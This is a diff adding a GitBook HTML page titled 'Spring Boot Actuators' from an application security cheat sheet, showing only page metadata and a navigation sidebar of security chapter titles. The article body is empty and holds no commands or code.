@@ -1,0 +1,2012 @@
+
+<!DOCTYPE HTML>
+<html lang="" >
+    <head>
+        <meta charset="UTF-8">
+        <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
+        <title>Spring Boot Actuators · GitBook</title>
+        <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+        <meta name="description" content="">
+        <meta name="generator" content="GitBook 3.2.3">
+        
+        
+        
+    
+    <link rel="stylesheet" href="../../gitbook/style.css">
+
+    
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-anchor-navigation-ex/style/plugin.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-highlight/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-search/search.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-fontsettings/website.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../gitbook/gitbook-plugin-theme-comscore/test.css">
+                
+            
+        
+
+    
+
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+        
+    
+    
+    <meta name="HandheldFriendly" content="true"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black">
+    <link rel="apple-touch-icon-precomposed" sizes="152x152" href="../../gitbook/images/apple-touch-icon-precomposed-152.png">
+    <link rel="shortcut icon" href="../../gitbook/images/favicon.ico" type="image/x-icon">
+
+    
+    <link rel="next" href="spring-data-redis-insecure-deserialization.html" />
+    
+    
+    <link rel="prev" href="spel-injection.html" />
+    
+
+    </head>
+    <body>
+        
+<div class="book">
+    <div class="book-summary">
+        
+            
+<div id="book-search-input" role="search">
+    <input type="text" placeholder="Type to search" />
+</div>
+
+            
+                <nav role="navigation">
+                
+
+
+<ul class="summary">
+    
+    
+
+    
+
+    
+        
+        
+    
+        <li class="chapter " data-level="1.1" data-path="../../">
+            
+                <a href="../../">
+            
+                    
+                    Introduction
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="1.2" data-path="../../INTRODUCTION.html">
+            
+                <a href="../../INTRODUCTION.html">
+            
+                    
+                    Application Security Cheat Sheet
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Android Application</li>
+        
+        
+    
+        <li class="chapter " data-level="2.1" >
+            
+                <span>
+            
+                    
+                    Overview
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.1.1" data-path="../../Mobile%20Application/Android/Overview/app-data-files.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/app-data-files.html">
+            
+                    
+                    Application Data & Files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.2" data-path="../../Mobile%20Application/Android/Overview/app-package.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/app-package.html">
+            
+                    
+                    Application Package
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.3" data-path="../../Mobile%20Application/Android/Overview/app-sandbox.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/app-sandbox.html">
+            
+                    
+                    Application Sandbox
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.4" data-path="../../Mobile%20Application/Android/Overview/app-signing.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/app-signing.html">
+            
+                    
+                    Application Signing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.5" data-path="../../Mobile%20Application/Android/Overview/deployment.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/deployment.html">
+            
+                    
+                    Deployment
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.1.6" data-path="../../Mobile%20Application/Android/Overview/package-manager.html">
+            
+                <a href="../../Mobile%20Application/Android/Overview/package-manager.html">
+            
+                    
+                    Package Manager
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.2" data-path="../../Mobile%20Application/Android/Intent%20Vulnerabilities/">
+            
+                <a href="../../Mobile%20Application/Android/Intent%20Vulnerabilities/">
+            
+                    
+                    Intent Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.2.1" data-path="../../Mobile%20Application/Android/Deep%20Linking%20Vulnerabilities/">
+            
+                <a href="../../Mobile%20Application/Android/Deep%20Linking%20Vulnerabilities/">
+            
+                    
+                    Deep Linking Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/">
+            
+                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/">
+            
+                    
+                    WebView Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="2.3.1" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-resource-response-vulnerabilities.html">
+            
+                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-resource-response-vulnerabilities.html">
+            
+                    
+                    WebResourceResponse Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="2.3.2" data-path="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-settings.html">
+            
+                <a href="../../Mobile%20Application/Android/WebView%20Vulnerabilities/web-settings.html">
+            
+                    
+                    WebSettings Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Cloud</li>
+        
+        
+    
+        <li class="chapter " data-level="3.1" >
+            
+                <span>
+            
+                    
+                    AWS
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="3.1.1" data-path="../../Cloud/AWS/api-gateway.html">
+            
+                <a href="../../Cloud/AWS/api-gateway.html">
+            
+                    
+                    Amazon API Gateway
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.2" data-path="../../Cloud/AWS/amazon-cognito.html">
+            
+                <a href="../../Cloud/AWS/amazon-cognito.html">
+            
+                    
+                    Amazon Cognito
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="3.1.3" data-path="../../Cloud/AWS/s3.html">
+            
+                <a href="../../Cloud/AWS/s3.html">
+            
+                    
+                    Amazon S3
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Container</li>
+        
+        
+    
+        <li class="chapter " data-level="4.1" >
+            
+                <span>
+            
+                    
+                    Overview
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.1.1" data-path="../../Container/Overview/basics.html">
+            
+                <a href="../../Container/Overview/basics.html">
+            
+                    
+                    Container Basics
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.1.2" data-path="../../Container/Overview/docker-engine.html">
+            
+                <a href="../../Container/Overview/docker-engine.html">
+            
+                    
+                    Docker Engine
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2" >
+            
+                <span>
+            
+                    
+                    Escaping
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="4.2.1" data-path="../../Container/Escaping/cve-list.html">
+            
+                <a href="../../Container/Escaping/cve-list.html">
+            
+                    
+                    CVE List
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2.2" data-path="../../Container/Escaping/exposed-docker-socket.html">
+            
+                <a href="../../Container/Escaping/exposed-docker-socket.html">
+            
+                    
+                    Exposed Docker Socket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2.3" data-path="../../Container/Escaping/excessive-capabilities.html">
+            
+                <a href="../../Container/Escaping/excessive-capabilities.html">
+            
+                    
+                    Excessive Capabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2.4" data-path="../../Container/Escaping/host-networking-driver.html">
+            
+                <a href="../../Container/Escaping/host-networking-driver.html">
+            
+                    
+                    Host Networking Driver
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="4.2.5" data-path="../../Container/Escaping/sensitive-mounts.html">
+            
+                <a href="../../Container/Escaping/sensitive-mounts.html">
+            
+                    
+                    Sensitive Mounts
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="4.3" data-path="../../Container/container-analysis-tools.html">
+            
+                <a href="../../Container/container-analysis-tools.html">
+            
+                    
+                    Container Analysis Tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Framework</li>
+        
+        
+    
+        <li class="chapter " data-level="5.1" >
+            
+                <span>
+            
+                    
+                    Spring
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.1.1" data-path="overview.html">
+            
+                <a href="overview.html">
+            
+                    
+                    Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.2" data-path="mass-assignment.html">
+            
+                <a href="mass-assignment.html">
+            
+                    
+                    Mass Assignment
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.3" data-path="routing-abuse.html">
+            
+                <a href="routing-abuse.html">
+            
+                    
+                    Routing Abuse
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.4" data-path="spel-injection.html">
+            
+                <a href="spel-injection.html">
+            
+                    
+                    SpEL Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter active" data-level="5.1.5" data-path="spring-boot-actuators.html">
+            
+                <a href="spring-boot-actuators.html">
+            
+                    
+                    Spring Boot Actuators
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.6" data-path="spring-data-redis-insecure-deserialization.html">
+            
+                <a href="spring-data-redis-insecure-deserialization.html">
+            
+                    
+                    Spring Data Redis Insecure Deserialization
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.1.7" data-path="view-manipulation.html">
+            
+                <a href="view-manipulation.html">
+            
+                    
+                    Spring View Manipulation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2" >
+            
+                <span>
+            
+                    
+                    React
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="5.2.1" data-path="../React/overview.html">
+            
+                <a href="../React/overview.html">
+            
+                    
+                    Overview
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="5.2.2" data-path="../React/security-issues.html">
+            
+                <a href="../React/security-issues.html">
+            
+                    
+                    Security Issues
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Linux</li>
+        
+        
+    
+        <li class="chapter " data-level="6.1" data-path="../../Linux/Overview/">
+            
+                <a href="../../Linux/Overview/">
+            
+                    
+                    Overview
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="6.1.1" data-path="../../Linux/Overview/philosophy.html">
+            
+                <a href="../../Linux/Overview/philosophy.html">
+            
+                    
+                    Philosophy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.2" data-path="../../Linux/Overview/file.html">
+            
+                <a href="../../Linux/Overview/file.html">
+            
+                    
+                    File
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.3" data-path="../../Linux/Overview/file-descriptor.html">
+            
+                <a href="../../Linux/Overview/file-descriptor.html">
+            
+                    
+                    File Descriptor
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.4" data-path="../../Linux/Overview/io-redirection.html">
+            
+                <a href="../../Linux/Overview/io-redirection.html">
+            
+                    
+                    I/O Redirection
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.5" data-path="../../Linux/Overview/process.html">
+            
+                <a href="../../Linux/Overview/process.html">
+            
+                    
+                    Process
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.6" data-path="../../Linux/Overview/inter-process-communication.html">
+            
+                <a href="../../Linux/Overview/inter-process-communication.html">
+            
+                    
+                    Inter Process Communication
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.7" data-path="../../Linux/Overview/shell.html">
+            
+                <a href="../../Linux/Overview/shell.html">
+            
+                    
+                    Shell
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.8" data-path="../../Linux/Overview/signals.html">
+            
+                <a href="../../Linux/Overview/signals.html">
+            
+                    
+                    Signals
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.9" data-path="../../Linux/Overview/socket.html">
+            
+                <a href="../../Linux/Overview/socket.html">
+            
+                    
+                    Socket
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="6.1.10" data-path="../../Linux/Overview/user-kernel-space.html">
+            
+                <a href="../../Linux/Overview/user-kernel-space.html">
+            
+                    
+                    User Space vs Kernel Space
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="6.2" data-path="../../Linux/bash-tips.html">
+            
+                <a href="../../Linux/bash-tips.html">
+            
+                    
+                    Bash Tips
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+        
+        <li class="header">iOS Application</li>
+        
+        
+    
+        <li class="chapter " data-level="7.1" >
+            
+                <span>
+            
+                    
+                    Overview
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="7.1.1" data-path="../../Mobile%20Application/iOS/Overview/app-data-files.html">
+            
+                <a href="../../Mobile%20Application/iOS/Overview/app-data-files.html">
+            
+                    
+                    Application Data & Files
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.1.2" data-path="../../Mobile%20Application/iOS/Overview/app-package.html">
+            
+                <a href="../../Mobile%20Application/iOS/Overview/app-package.html">
+            
+                    
+                    Application Package
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.1.3" data-path="../../Mobile%20Application/iOS/Overview/app-sandbox.html">
+            
+                <a href="../../Mobile%20Application/iOS/Overview/app-sandbox.html">
+            
+                    
+                    Application Sandbox
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.1.4" data-path="../../Mobile%20Application/iOS/Overview/app-signing.html">
+            
+                <a href="../../Mobile%20Application/iOS/Overview/app-signing.html">
+            
+                    
+                    Application Signing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.1.5" data-path="../../Mobile%20Application/iOS/Overview/deployment.html">
+            
+                <a href="../../Mobile%20Application/iOS/Overview/deployment.html">
+            
+                    
+                    Deployment
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2" >
+            
+                <span>
+            
+                    
+                    Getting Started
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="7.2.1" data-path="../../Mobile%20Application/iOS/Getting%20Started/ipa-patching.html">
+            
+                <a href="../../Mobile%20Application/iOS/Getting%20Started/ipa-patching.html">
+            
+                    
+                    IPA Patching
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2.2" data-path="../../Mobile%20Application/iOS/Getting%20Started/source-patching.html">
+            
+                <a href="../../Mobile%20Application/iOS/Getting%20Started/source-patching.html">
+            
+                    
+                    Source Code Patching
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="7.2.3" data-path="../../Mobile%20Application/iOS/Getting%20Started/objection.html">
+            
+                <a href="../../Mobile%20Application/iOS/Getting%20Started/objection.html">
+            
+                    
+                    Testing with Objection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Resources</li>
+        
+        
+    
+        <li class="chapter " data-level="8.1" >
+            
+                <span>
+            
+                    
+                    Lists
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="8.1.1" data-path="../../Resources/Lists/payloads.html">
+            
+                <a href="../../Resources/Lists/payloads.html">
+            
+                    
+                    Payloads
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.1.2" data-path="../../Resources/Lists/wordlists.html">
+            
+                <a href="../../Resources/Lists/wordlists.html">
+            
+                    
+                    Wordlists
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="8.2" >
+            
+                <span>
+            
+                    
+                    Researching
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="8.2.1" data-path="../../Resources/Researching/web-application.html">
+            
+                <a href="../../Resources/Researching/web-application.html">
+            
+                    
+                    Web Application
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.2.2" data-path="../../Resources/Researching/write-ups.html">
+            
+                <a href="../../Resources/Researching/write-ups.html">
+            
+                    
+                    Write-ups
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3" >
+            
+                <span>
+            
+                    
+                    Software
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="8.3.1" data-path="../../Resources/Software/aws-tools.html">
+            
+                <a href="../../Resources/Software/aws-tools.html">
+            
+                    
+                    AWS Tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.2" data-path="../../Resources/Software/azure-tools.html">
+            
+                <a href="../../Resources/Software/azure-tools.html">
+            
+                    
+                    Azure Tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.3" data-path="../../Resources/Software/component-analysis.html">
+            
+                <a href="../../Resources/Software/component-analysis.html">
+            
+                    
+                    Component Analysis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.4" data-path="../../Resources/Software/docker-analysis.html">
+            
+                <a href="../../Resources/Software/docker-analysis.html">
+            
+                    
+                    Docker Analysis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.5" data-path="../../Resources/Software/dynamic-analysis.html">
+            
+                <a href="../../Resources/Software/dynamic-analysis.html">
+            
+                    
+                    Dynamic Analysis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.6" data-path="../../Resources/Software/fuzzing.html">
+            
+                <a href="../../Resources/Software/fuzzing.html">
+            
+                    
+                    Fuzzing
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.7" data-path="../../Resources/Software/gcp-tools.html">
+            
+                <a href="../../Resources/Software/gcp-tools.html">
+            
+                    
+                    GCP Tools
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.8" data-path="../../Resources/Software/reverse-engineering.html">
+            
+                <a href="../../Resources/Software/reverse-engineering.html">
+            
+                    
+                    Reverse Engineering
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.9" data-path="../../Resources/Software/static-analysis.html">
+            
+                <a href="../../Resources/Software/static-analysis.html">
+            
+                    
+                    Static Analysis
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="8.3.10" data-path="../../Resources/Software/vulnerability-scanning.html">
+            
+                <a href="../../Resources/Software/vulnerability-scanning.html">
+            
+                    
+                    Vulnerability Scanning
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="8.4" >
+            
+                <span>
+            
+                    
+                    Training
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="8.4.1" data-path="../../Resources/Training/secure-development.html">
+            
+                <a href="../../Resources/Training/secure-development.html">
+            
+                    
+                    Secure Development
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+
+    
+        
+        <li class="header">Web Application</li>
+        
+        
+    
+        <li class="chapter " data-level="9.1" data-path="../../Web%20Application/Abusing%20HTTP%20hop-by-hop%20Request%20Headers/">
+            
+                <a href="../../Web%20Application/Abusing%20HTTP%20hop-by-hop%20Request%20Headers/">
+            
+                    
+                    Abusing HTTP hop-by-hop Request Headers
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.2" data-path="../../Web%20Application/Broken%20Authentication/">
+            
+                <a href="../../Web%20Application/Broken%20Authentication/">
+            
+                    
+                    Broken Authentication
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.2.1" data-path="../../Web%20Application/Broken%20Authentication/two-factor-authentication-vulnerabilities.html">
+            
+                <a href="../../Web%20Application/Broken%20Authentication/two-factor-authentication-vulnerabilities.html">
+            
+                    
+                    Two-Factor Authentication Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.3" data-path="../../Web%20Application/Command%20Injection/">
+            
+                <a href="../../Web%20Application/Command%20Injection/">
+            
+                    
+                    Command Injection
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.3.1" data-path="../../Web%20Application/Command%20Injection/parameters-injection.html">
+            
+                <a href="../../Web%20Application/Command%20Injection/parameters-injection.html">
+            
+                    
+                    Parameters Injection
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.4" data-path="../../Web%20Application/Content%20Security%20Policy/">
+            
+                <a href="../../Web%20Application/Content%20Security%20Policy/">
+            
+                    
+                    Content Security Policy
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.5" data-path="../../Web%20Application/Cookie%20Security/">
+            
+                <a href="../../Web%20Application/Cookie%20Security/">
+            
+                    
+                    Cookie Security
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.5.1" data-path="../../Web%20Application/Cookie%20Security/cookie-bomb.html">
+            
+                <a href="../../Web%20Application/Cookie%20Security/cookie-bomb.html">
+            
+                    
+                    Cookie Bomb
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.5.2" data-path="../../Web%20Application/Cookie%20Security/cookie-jar-overflow.html">
+            
+                <a href="../../Web%20Application/Cookie%20Security/cookie-jar-overflow.html">
+            
+                    
+                    Cookie Jar Overflow
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.5.3" data-path="../../Web%20Application/Cookie%20Security/cookie-tossing.html">
+            
+                <a href="../../Web%20Application/Cookie%20Security/cookie-tossing.html">
+            
+                    
+                    Cookie Tossing
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.6" data-path="../../Web%20Application/CORS%20Misconfiguration/">
+            
+                <a href="../../Web%20Application/CORS%20Misconfiguration/">
+            
+                    
+                    CORS Misconfiguration
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.7" data-path="../../Web%20Application/File%20Upload%20Vulnerabilities/">
+            
+                <a href="../../Web%20Application/File%20Upload%20Vulnerabilities/">
+            
+                    
+                    File Upload Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.8" data-path="../../Web%20Application/GraphQL%20Vulnerabilities/">
+            
+                <a href="../../Web%20Application/GraphQL%20Vulnerabilities/">
+            
+                    
+                    GraphQL Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.9" >
+            
+                <span>
+            
+                    
+                    HTML Injection
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.9.1" data-path="../../Web%20Application/HTML%20Injection/base.html">
+            
+                <a href="../../Web%20Application/HTML%20Injection/base.html">
+            
+                    
+                    base
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.9.2" data-path="../../Web%20Application/HTML%20Injection/iframe.html">
+            
+                <a href="../../Web%20Application/HTML%20Injection/iframe.html">
+            
+                    
+                    iframe
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.9.3" data-path="../../Web%20Application/HTML%20Injection/meta.html">
+            
+                <a href="../../Web%20Application/HTML%20Injection/meta.html">
+            
+                    
+                    meta
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.9.4" data-path="../../Web%20Application/HTML%20Injection/target.html">
+            
+                <a href="../../Web%20Application/HTML%20Injection/target.html">
+            
+                    
+                    target attribute
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.10" data-path="../../Web%20Application/HTTP%20Headers%20Security/">
+            
+                <a href="../../Web%20Application/HTTP%20Headers%20Security/">
+            
+                    
+                    HTTP Header Security
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.11" data-path="../../Web%20Application/HTTP%20Request%20Smuggling/">
+            
+                <a href="../../Web%20Application/HTTP%20Request%20Smuggling/">
+            
+                    
+                    HTTP Request Smuggling
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.12" data-path="../../Web%20Application/Improper%20Rate%20Limits/">
+            
+                <a href="../../Web%20Application/Improper%20Rate%20Limits/">
+            
+                    
+                    Improper Rate Limits
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.13" data-path="../../Web%20Application/JavaScript%20Prototype%20Pollution/">
+            
+                <a href="../../Web%20Application/JavaScript%20Prototype%20Pollution/">
+            
+                    
+                    JavaScript Prototype Pollution
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.14" data-path="../../Web%20Application/JSON%20Web%20Token%20Vulnerabilities/">
+            
+                <a href="../../Web%20Application/JSON%20Web%20Token%20Vulnerabilities/">
+            
+                    
+                    JSON Web Token Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.15" data-path="../../Web%20Application/OAuth%202.0%20Vulnerabilities/">
+            
+                <a href="../../Web%20Application/OAuth%202.0%20Vulnerabilities/">
+            
+                    
+                    OAuth 2.0 Vulnerabilities
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.15.1" data-path="../../Web%20Application/OAuth%202.0%20Vulnerabilities/openid-connect.html">
+            
+                <a href="../../Web%20Application/OAuth%202.0%20Vulnerabilities/openid-connect.html">
+            
+                    
+                    OpenID Connect Vulnerabilities
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.16" data-path="../../Web%20Application/Race%20Condition/">
+            
+                <a href="../../Web%20Application/Race%20Condition/">
+            
+                    
+                    Race Condition
+            
+                </a>
+            
+
+            
+        </li>
+    
+        <li class="chapter " data-level="9.17" data-path="../../Web%20Application/Server%20Side%20Request%20Forgery/">
+            
+                <a href="../../Web%20Application/Server%20Side%20Request%20Forgery/">
+            
+                    
+                    Server Side Request Forgery
+            
+                </a>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="9.17.1" data-path="../../Web%20Application/Server%20Side%20Request%20Forgery/post-exploitation.html">
+            
+                <a href="../../Web%20Application/Server%20Side%20Request%20Forgery/post-exploitation.html">
+            
+                    
+                    Post Exploitation
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
+        <li class="chapter " data-level="9.18" data-path="../../Web%20Application/Web%20Cache%20Poisoning/">
+            
+                <a href="../../Web%20Application/Web%20Cache%20Poisoning/">
+            
+                    
+                    Web Cache Poisoning
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+    
+
+    <li class="divider"></li>
+
+    <li>
+        <a href="https://www.gitbook.com" target="blank" class="gitbook-link">
+            Published with GitBook
+        </a>
+    </li>
+</ul>
+
+
+                </nav>
+            
+        
+    </div>
+
+    <div class="book-body">
+        
+            <div class="body-inner">
+                
+                    
+
+<div class="book-header" role="navigation">
+    
+
+    <!-- Title -->
+    <h1>
+        <i class="fa fa-circle-o-notch fa-spin"></i>
+        <a href="../.." >Spring Boot Actuators</a>
+    </h1>
+</div>
+
+
+
+
+                    <div class="page-wrapper" tabindex="-1" role="main">
+                        <div class="page-inner">
+                            
+<div id="book-search-results">
+    <div class="search-noresults">
+    
+                                <section class="normal markdown-section">
+                                
